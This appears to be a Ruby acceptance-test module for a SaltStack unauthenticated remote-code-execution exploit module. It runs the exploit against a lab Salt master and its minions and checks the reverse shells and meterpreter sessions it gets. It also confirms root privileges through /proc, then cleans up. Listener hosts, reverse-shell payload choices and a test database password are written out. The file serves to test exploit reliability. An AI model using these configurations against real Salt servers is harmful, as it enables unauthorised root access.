# frozen_string_literal: true

require 'base64'
require 'digest'
require 'English'
require 'fileutils'
require 'securerandom'
require 'timeout'
require_relative '../../../tools/dev/run_module_target_tests'

module Acceptance
  # Exercise real sessions and persisted state against the native Salt cluster.
  module SaltstackRce
    OWNER = 'exploit/linux/misc/saltstack_salt_unauth_rce'
    CALLBACK = 4473
    STAGER = 8097
    TARGETS = [
      ['Master Python', 'python/meterpreter/reverse_https', ['master']],
      ['Master Unix command', 'cmd/unix/reverse_python_ssl', ['master']],
      ['Minions Python', 'python/meterpreter/reverse_https', ['minion-a', 'minion-b']],
      ['Minions Unix command', 'cmd/unix/reverse_python', ['minion-a', 'minion-b']]
    ].freeze

    def sx_json(expression)
      code = "puts 'SALT_JSON=' + (#{expression}).to_json"
      output = console_command("irb -e #{code.inspect}", timeout: 60)
      rows = output.lines.grep(/^SALT_JSON=/)
      expect(rows.length).to eq(1), output
      JSON.parse(rows.fetch(0).delete_prefix('SALT_JSON='))
    end

    def sx_poll(seconds, &block)
      Timeout.timeout(seconds) { wait_for_expect(400, 0.1, &block) }
    end

    def sx_record(name, data)
      File.open(File.join(target_runtime.fetch('artifacts'), name), 'a') { |file| file.puts(JSON.generate(data)) }
    end

    def sx_native(phase)
      output = +''
      argv = ['python3', 'test/module_targets/saltstack_rce/native_probe.py', ENV.fetch('MODULE_TARGET_RUNTIME'), phase]
      expect(ModuleTargetTests.new.send(:command, argv, path: File.join(target_runtime.fetch('artifacts'), "native-#{phase}.log"), timeout: 300, capture: output, quiet: true)).to be(true), output
      document = JSON.parse(File.read(File.join(target_runtime.fetch('artifacts'), "native-#{phase}.json")))
      expect(document.fetch('status')).to eq('native_passed')
      document
    end

    def sx_sql(query)
      target_exec('reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
    end

    def sx_sessions_sql
      raise ArgumentError, 'Invalid fixture workspace' unless @workspace.match?(/\Asr_[0-9_]+\z/)

      rows = JSON.parse(sx_sql("SELECT coalesce(json_agg(row_to_json(s) ORDER BY s.id),'[]'::json) FROM sessions s JOIN hosts h ON h.id=s.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}'"))
      sx_record('session-sql.jsonl', workspace: @workspace, rows: rows)
      rows
    end

    def sx_connections
      code = File.read('test/module_targets/superset_rce_owner/connection_state.py')
      JSON.parse(target_exec('target', 'python', '-c', code, listener_host, CALLBACK.to_s))
    end

    def sx_listeners
      code = 'require "json";ports=ARGV.map(&:to_i);puts JSON.generate(%w[/proc/net/tcp /proc/net/tcp6].flat_map{|path|File.readlines(path).drop(1).map(&:split)}.select{|row|row[3]=="0A"&&ports.include?(row[1].split(":").last.to_i(16))})'
      JSON.parse(target_exec('framework', 'ruby', '-e', code, CALLBACK.to_s, STAGER.to_s))
    end

    def sx_jobs
      output = target_exec('target', 'python', '-c', File.read('test/module_targets/saltstack_rce/jobs.py'))
      rows = sx_document(output, 'SALT_JOBS=')
      sx_record('salt-job-results.jsonl', workspace: @workspace, rows: rows)
      rows
    end

    def sx_document(output, prefix)
      rows = output.lines.grep(/^#{Regexp.escape(prefix)}/)
      expect(rows.length).to eq(1), output
      JSON.parse(rows.fetch(0).delete_prefix(prefix))
    end

    def sx_cleanup
      original_error = RSpec.current_example&.exception || $ERROR_INFO
      begin
        console_command('sessions -K')
        console_command('jobs -K')
        sx_poll(20) { expect(sx_json('framework.sessions.keys')).to eq([]) }
        sx_poll(20) { expect(sx_json('framework.jobs.keys')).to eq([]) }
        sx_poll(20) { expect(sx_listeners).to eq([]) }
        sx_poll(20) { expect(sx_connections.reject { |row| row.fetch('state') == '06' }).to eq([]) }
      ensure
        if @salt_job_observer
          failure = original_error || $ERROR_INFO
          sx_finish_job_observer(abort: !failure.nil?, original_error: failure)
        end
      end
    end

    def sx_start_job_observer(target, options)
      raise 'Previous Salt observer was not cleaned up' if @salt_job_observer

      configuration = {
        selector: options.fetch('MINIONS', '.*'),
        function: target == 2 ? 'cmd.exec_code' : 'cmd.run'
      }
      output = target_exec('target', 'python', '/opt/module-target/job_control.py', 'start', JSON.generate(configuration))
      document = sx_document(output, 'SALT_JOB_CONTROL=')
      @salt_job_observer = document
      sx_record('salt-job-observers.jsonl', workspace: @workspace, phase: 'ready', observer: document)
      expect(document.fetch('status')).to eq('ready')
      expect(document.fetch('worker').fetch('state')).not_to eq('Z')
      expect(document.fetch('worker').fetch('starttime')).to match(/\A[0-9]+\z/)
      expect(document.fetch('script_sha256')).to eq(Digest::SHA256.file('test/module_targets/saltstack_rce/job_control.py').hexdigest)
    end

    def sx_observer_command(observer, action)
      arguments = ['target', 'python', '/opt/module-target/job_control.py', action, observer.fetch('observer_identifier')]
      arguments << observer.fetch('jid') if action == 'finish'
      sx_document(target_exec(*arguments), 'SALT_JOB_CONTROL=')
    end

    def sx_export_job_observer(observer)
      identifier = observer.fetch('observer_identifier')
      raise ArgumentError, 'Invalid observer identifier' unless identifier.match?(/\A[a-f0-9]{32}\z/)

      document = sx_observer_command(observer, 'export')
      expect(document.fetch('status')).to eq('exported')
      expect(document.fetch('observer_identifier')).to eq(identifier)
      directory = File.join(target_runtime.fetch('artifacts'), 'salt-job-observers', identifier)
      document.fetch('files').each do |entry|
        parts = entry.fetch('name').split('/')
        unless parts.length.between?(1, 2) && parts.all? { |part| part.match?(/\A[a-z0-9][a-z0-9.-]*\z/) && !%w[. ..].include?(part) }
          raise ArgumentError, 'Unexpected observer export path'
        end

        raw = Base64.strict_decode64(entry.fetch('bytes_base64'))
        expect(Digest::SHA256.hexdigest(raw)).to eq(entry.fetch('sha256'))
        destination = File.join(directory, *parts)
        FileUtils.mkdir_p(File.dirname(destination))
        File.binwrite(destination, raw)
        expect(Digest::SHA256.file(destination).hexdigest).to eq(entry.fetch('sha256'))
      end
      manifest = document.fetch('files').map { |entry| entry.except('bytes_base64') }
      File.write(File.join(directory, 'export-manifest.json'), JSON.generate(manifest))
      sx_record('salt-job-observer-exports.jsonl', workspace: @workspace, observer_identifier: identifier, files: manifest)
    end

    def sx_finish_job_observer(abort: false, original_error: nil)
      observer = @salt_job_observer
      stopped = false
      failure = nil
      begin
        action = !abort && observer['jid'] ? 'finish' : 'abort'
        document = sx_observer_command(observer, action)
        stopped = document.fetch('observer_stopped')
        sx_record('salt-job-observers.jsonl', workspace: @workspace, phase: action, observer: document)
        expect(stopped).to be(true)
        if action == 'finish'
          expect(document.fetch('status')).to eq('passed'), JSON.generate(document)
          expect(document.fetch('file_dropper_qualified')).to be(false)
        end
      rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
        failure = e
      ensure
        begin
          unless stopped
            document = sx_observer_command(observer, 'abort')
            sx_record('salt-job-observers.jsonl', workspace: @workspace, phase: 'abort_fallback', observer: document)
            stopped = document.fetch('observer_stopped')
            raise 'Salt observer abort did not stop its actual process' unless stopped
          end
          sx_export_job_observer(observer)
          document = sx_observer_command(observer, 'prune')
          expect(document.fetch('status')).to eq('pruned')
          sx_record('salt-job-observer-cleanup.jsonl', workspace: @workspace, observer_identifier: observer.fetch('observer_identifier'), stopped: stopped, pruned: true)
          @salt_job_observer = nil
        rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
          sx_record('salt-job-observer-cleanup.jsonl', workspace: @workspace, observer_identifier: observer.fetch('observer_identifier'), error: e.class.name, message: e.message)
          failure ||= e
        end
      end
      raise failure if failure && original_error.nil?
    end

    def sx_call(target, options = {}, action: 'run -z')
      output = nil
      values = {
        'TARGET' => target, 'PAYLOAD' => TARGETS.fetch(target).fetch(1),
        'LHOST' => listener_host, 'LPORT' => CALLBACK, 'SRVHOST' => listener_host,
        'SRVPORT' => STAGER, 'ConnectTimeout' => 3,
        'WfsDelay' => 15
      }.merge(options)
      begin
        if target >= 2 && action != 'check'
          # Existing verbose output exposes the genuine JID even when no minion
          # matches. No payload/handler/source method is altered for observation.
          values['VERBOSE'] = true
          sx_start_job_observer(target, options)
        end
        output = run_target_module(OWNER, 'target', values, action: action, allow_errors: true, command_timeout: 90)
        if @salt_job_observer
          publications = output.lines.grep(/Unserialized clear load:.*"cmd"=>"_send_pub"/)
          identifiers = publications.filter_map { |line| line[/"jid"=>"([0-9]{20})"/, 1] }
          expect(identifiers.length).to eq(1), output
          @salt_job_observer['jid'] = identifiers.fetch(0)
        end
      ensure
        sx_record('owning-calls.jsonl', {
          workspace: @workspace, action: action, target: target, options: values,
          wrapper_returned: !output.nil?, output: (output || console.all_data).dup.force_encoding(Encoding::UTF_8)
        })
        sx_jobs
      end
      expect(output).not_to include('Unknown datastore option')
      output
    end

    def sx_proof(identifier, payload, owner: OWNER)
      path = "/tmp/module-target-salt-proof-#{SecureRandom.hex(6)}"
      value = "salt-session-#{SecureRandom.hex(12)}"
      proof = sx_json("SaltSessionControl.proof(framework,#{identifier},#{path.inspect},#{value.inspect})")
      expect(proof.fetch('type')).to eq(payload.include?('meterpreter') ? 'meterpreter' : 'shell')
      role = proof.fetch('role')
      expect(@native.fetch('cluster').fetch('roles').keys).to include(role)
      expect(proof.fetch('token')).to eq(@native.fetch('cluster').fetch('roles').fetch(role).fetch('token'))
      expect(proof.fetch('via_exploit')).to eq(owner)
      expect(target_exec('target', 'cat', path)).to eq(value)
      expect(target_exec('target', 'stat', '-c', '%u', path).strip).to eq('0')
      pids = if proof.fetch('type') == 'meterpreter'
               [proof.fetch('pid')]
             else
               connections = sx_connections.select { |row| row.fetch('state') == '01' }
               expect(connections).not_to be_empty
               proof['connections'] = connections
               connections.flat_map { |row| row.fetch('owners') }.map { |row| row.fetch('pid') }.uniq.select do |pid|
                 code = 'import json,pathlib,sys; data=pathlib.Path("/proc",sys.argv[1],"environ").read_bytes().split(bytes([0]));print(json.dumps(dict(item.split(b"=",1) for item in data if b"=" in item).get(b"MSF_MODULE_TARGET_TOKEN",b"").decode()))'
                 JSON.parse(target_exec('target', 'python', '-c', code, pid.to_s)) == proof.fetch('token')
               end
             end
      expect(pids).not_to be_empty
      pids.each do |pid|
        expect(target_exec('target', 'cat', "/proc/#{pid}/status")).to match(/^Uid:\s+0\s+0\s+0\s+0$/)
      end
      if @salt_job_observer
        request = { jid: @salt_job_observer.fetch('jid'), role: role, pids: pids, token: proof.fetch('token') }
        output = target_exec('target', 'python', '/opt/module-target/job_control.py', 'proof', @salt_job_observer.fetch('observer_identifier'), JSON.generate(request))
        ancestry = sx_document(output, 'SALT_JOB_CONTROL=')
        sx_record('salt-job-ancestry.jsonl', workspace: @workspace, session_id: identifier, observation: ancestry)
        expect(ancestry.fetch('status')).to eq('passed'), JSON.generate(ancestry)
        proof['salt_job_ancestry'] = ancestry.fetch('proof')
      end
      proof['target_pids'] = pids
      proof['proof_sha256'] = Digest::SHA256.hexdigest(value)
      sx_json("SaltSessionControl.close(framework,#{identifier})")
      sx_poll(20) do
        code = 'import json,pathlib,sys;print(json.dumps([pid for pid in sys.argv[1:] if pathlib.Path("/proc",pid).exists()]))'
        expect(JSON.parse(target_exec('target', 'python', '-c', code, *pids.map(&:to_s)))).to eq([])
      end
      target_exec('target', 'rm', '-f', path)
      sx_record('session-proofs.jsonl', workspace: @workspace, proof: proof)
      proof
    end

    def sx_sdk_ssl
      payload = 'cmd/unix/reverse_python_ssl'
      expect(sx_json('framework.sessions.keys')).to eq([])
      File.write(File.join(target_runtime.fetch('artifacts'), 'ready-sessions.jsonl'), '')
      console_command('use exploit/multi/handler')
      { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => CALLBACK, 'ExitOnSession' => false }.each do |name, value|
        console_command("set #{name} #{value}")
      end
      console_command('run -j -z')
      jobs = sx_json('framework.jobs.keys')
      expect(jobs.length).to eq(1)
      generated = sx_json("RocketmqSessionControl.command(framework.jobs.fetch(#{jobs.first.inspect}),#{payload.inspect})")
      output = target_exec('target', 'python', '-c', File.read('test/module_targets/saltstack_rce/sdk_launch.py'), generated.fetch('command_base64'))
      launch = sx_document(output, 'SALT_SDK=')
      sx_record('native-payload-dispatches.jsonl', workspace: @workspace, generated: generated, launch: launch)
      expect(launch.fetch('status')).to eq('sdk_dispatched')
      identifiers = sx_ready(1)
      proof = sx_proof(identifiers.fetch(0), payload, owner: 'exploit/multi/handler')
      expect(proof.fetch('role')).to eq('master')
      sx_record('native-payload-calibrations.jsonl', workspace: @workspace, generated: generated, launch: launch, proof: proof)
      sx_jobs
      sx_cleanup
    end

    def sx_ready(count)
      identifiers = nil
      sx_poll(35) do
        active = sx_json('framework.sessions.keys')
        events = File.readlines(File.join(target_runtime.fetch('artifacts'), 'ready-sessions.jsonl')).map { |line| JSON.parse(line) }
        identifiers = events.map { |row| row.fetch('id') }.select { |identifier| active.include?(identifier) }.uniq
        expect(identifiers.length).to eq(count)
        # Registration precedes bootstrap and database reporting in the real
        # scheduler. A registered object alone is not ready for proof APIs.
        rows = sx_json("framework.sessions.values.select { |session| #{identifiers.inspect}.include?(session.sid) }.map { |session| session.db_record&.id }")
        expect(rows).to all(be_a(Integer))
      end
      identifiers
    end

    def sx_exploit(target, roles: TARGETS.fetch(target).fetch(2), options: {})
      expect(sx_json('framework.sessions.keys')).to eq([])
      File.write(File.join(target_runtime.fetch('artifacts'), 'ready-sessions.jsonl'), '')
      output = sx_call(target, options)
      expect(output).not_to include('Exploit completed, but no session was created')
      identifiers = sx_ready(roles.length)
      proofs = identifiers.map { |identifier| sx_proof(identifier, TARGETS.fetch(target).fetch(1)) }
      expect(proofs.map { |proof| proof.fetch('role') }.sort).to eq(roles.sort)
      rows = sx_sessions_sql
      expect(rows.map { |row| row.fetch('id') }).to include(*proofs.map { |proof| proof.fetch('db_id') })
      sx_cleanup
      proofs
    end
  end
end
